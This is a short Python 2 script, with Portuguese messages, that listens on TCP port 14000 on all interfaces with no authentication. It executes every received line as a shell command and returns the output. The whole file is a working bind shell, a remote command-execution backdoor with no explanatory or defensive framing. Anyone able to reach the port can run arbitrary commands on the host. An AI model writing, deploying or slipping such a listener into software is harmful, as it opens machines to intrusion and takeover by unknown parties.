#coding: utf-8

import socket
import commands

HOST = ''
PORT = 14000

def main():
  serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  cliente = (HOST, PORT)

  serverSocket.bind(cliente)
  serverSocket.listen(1)

  while True:
    conexao, cliente = serverSocket.accept()

    print ('Concetado por ', cliente)
    while (True):
        msg = conexao.recv(2048).decode()
        if not msg: break

        status, output = commands.getstatusoutput(msg)

        conexao.send(output)

        print(msg, status)

    print ('Finalizando conexao do cliente ', cliente)
    conexao.close()
  serverSocket.close()

if __name__ == "__main__":
    main()
